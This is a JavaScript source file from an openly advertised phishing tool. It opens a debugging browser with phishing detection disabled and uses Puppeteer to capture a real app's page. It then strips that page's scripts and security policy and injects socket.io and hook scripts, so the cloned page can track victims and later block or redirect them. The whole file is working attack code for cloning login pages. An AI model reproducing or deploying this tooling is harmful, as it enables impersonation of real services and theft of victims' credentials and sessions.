/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const { ssd, books, checkId } = require("../utils/utils")
const { getHeaders } = require("./headers")
const { getAppUrl } = require("./appUrls")
const puppeteer = require("puppeteer-core")
const { default: axios } = require("axios")
const cheerio = require("cheerio")
const fs = require("fs")
const os = require("os")
const open = require("open")

class Application {
    constructor(configuration) {
        // configuration
        this.appName = configuration.appName
        this.port = configuration.port
        this.id = configuration.id
        this.device = configuration.device
        this.status = configuration.status
        this.config = ssd.getItem("config.json")
    }

    async openBrowser() { // opening the debuging browser
        const userDir = `${os.userInfo().homedir}/white-spikes-browser/${this.appName}-${this.id}`
        try {
            await (await axios.get(`http://127.0.0.1:${this.port}/json/version`)).data
        } catch (error) {
            if (error.code != "ECONNREFUSED") {
                console.log("Error while opening browser")
                console.log(`::- open manually ${this.config.browser} --remote-debugging-port=${this.port} --user-data-dir=${userDir}`)
                return
            }
            const options = [
                '--allow-pre-commit-input',
                '--disable-background-networking',
                '--enable-features=NetworkServiceInProcess2',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-breakpad',
                '--disable-client-side-phishing-detection',
                '--disable-component-extensions-with-background-pages',
                '--disable-default-apps',
                '--disable-dev-shm-usage',
                '--disable-extensions',
                '--disable-features=Translate,BackForwardCache,AcceptCHFrame,AvoidUnnecessaryBeforeUnloadCheckSync',
                '--disable-hang-monitor',
                '--disable-ipc-flooding-protection',
                '--disable-popup-blocking',
                '--disable-prompt-on-repost',
                '--disable-renderer-backgrounding',
                '--disable-sync',
                '--force-color-profile=srgb',
                '--metrics-recording-only',
                '--no-first-run',
                '--password-store=basic',
                '--use-mock-keychain',
                '--export-tagged-pdf',
                '--disable-infobars',
                '--lang=en-US',
                `--remote-debugging-port=${this.port}`,
                `--user-data-dir=${userDir}`
            ]

            await open("", { "app": { name: this.config.browser, "arguments": options } })
        }
    }

    async connectBrowser() { // connect to debugging browser
        let maxRetries = 5

        for (let retry = 1; retry <= maxRetries; retry++) { // try until the browser open
            try {
                return await puppeteer.connect({
                    browserURL: `http://127.0.0.1:${this.port}`,
                    defaultViewport: null
                })
            } catch (error) {
                console.error(`Attempt to connect debug browser ${retry} failed: ${error.message}`)

                if (retry < maxRetries) {
                    await new Promise(resolve => setTimeout(resolve, 2000))
                } else {
                    console.log("max ERROR", error)
                }
            }
        }
    }

    async openTAB(removeAllJs = undefined, timeout = undefined) { // open url
        try {
            let url = getAppUrl(this.appName, this.device)
            const browser = await this.connectBrowser()
            const pages = await browser.pages()
            const page = pages[0]

            try {
                await page.setExtraHTTPHeaders(getHeaders(this.device))
                await page.goto(url, { waitUntil: "load" })

                if (timeout) {
                    await new Promise(resolve => setTimeout(resolve, timeout))
                }

            } catch (error) {
                if (error.message.includes("net::ERR_TOO_MANY_REDIRECTS")) {
                    await new Promise(re => setTimeout(re, 2000))
                }
            }

            const html = await page.content()
            return this.alterHTML(html, removeAllJs)
        } catch (error) {
            console.log("browser is not opened or other issues.\n", error)
        }
    }

    async closeBrowser() { // close the browser
        try {
            const browser = await this.connectBrowser()
            await browser.close()
        } catch (error) {
            console.log(error)
            console.log("browser is not opened")
        }
    }

    // async getRequest(removeAllJs) { // get request from target deprecated
    //     try {
    //         let url = getAppUrl(this.appName, this.device)
    //         let html = await (await axios.get(url)).data

    //         return this.alterHTML(html, removeAllJs)
    //     } catch (error) {
    //         console.log("AXIOS ERROR on homepage:", error)
    //         return "<h1>TRY AGAIN LATER.</h1>"
    //     }
    // }

    alterHTML(html, removeAllJs) { // altering the html
        if (removeAllJs) {
            const $ = cheerio.load(html)
            $("script").remove()
            if ($(`[http-equiv="Content-Security-Policy"]`).length > 0) {
                $(`[http-equiv="Content-Security-Policy"]`).remove()
            }
            html = $.html()
        }

        let alterJs = fs.readFileSync(`${__dirname}/${this.appName}/alter.js`).toString()
        html += `
            <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.js"
            integrity="sha512-xbQU0+iHqhVt7VIXi6vBJKPh3IQBF5B84sSHdjKiSccyX/1ZI7Vnkt2/8y8uruj63/DVmCxfUNohPNruthTEQA=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
            <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
            <script spikes-script-tag>
                document.head.innerHTML += '<meta name="viewport" content="width=device-width, initial-scale=1.0">'
                ${alterJs}
            </script>
            <script src="/assets/js/spikes-hook-b.js"></script>`

        return html
    }

    setUserBlock() {
        let page = checkId(this.id)
        if (page) {
            page.status = "block"
            books.setItem(`${this.id}.json`, page)
        }
    }

    setUserRedirect() {
        let page = checkId(this.id)
        if (page) {
            page.status = "redirect"
            books.setItem(`${this.id}.json`, page)
        }
    }
}

module.exports = {
    Application
}